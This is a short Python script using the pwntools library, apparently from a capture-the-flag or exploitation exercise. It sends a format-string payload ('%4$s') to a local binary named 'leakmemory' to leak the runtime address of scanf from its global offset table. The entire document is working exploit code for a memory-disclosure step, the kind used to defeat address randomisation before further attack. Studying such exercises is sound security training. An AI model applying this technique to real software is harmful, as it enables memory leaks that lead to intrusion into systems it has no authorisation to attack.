#!/usr/bin/env python
from pwn import *
local = 1
context.log_level = 'debug'
context.arch = 'i386'
if local:
	p = process('./leakmemory')
else:
	p = remote('127.0.0.1', 8888)
elf = ELF('./leakmemory')
__isoc99_scanf_got = elf.got['__isoc99_scanf']
log.success('__isoc99_scanf_got = ' + hex(__isoc99_scanf_got))
offset = 4
fmt = '%{}$s'
payload = flat([__isoc99_scanf_got, fmt.format(str(offset))])
p.sendline(payload)
p.recvuntil('%4$s\n')
scanf_addr = u32(p.recv()[4:8])
log.success('scanf_addr = ' + hex(scanf_addr))
p.close()
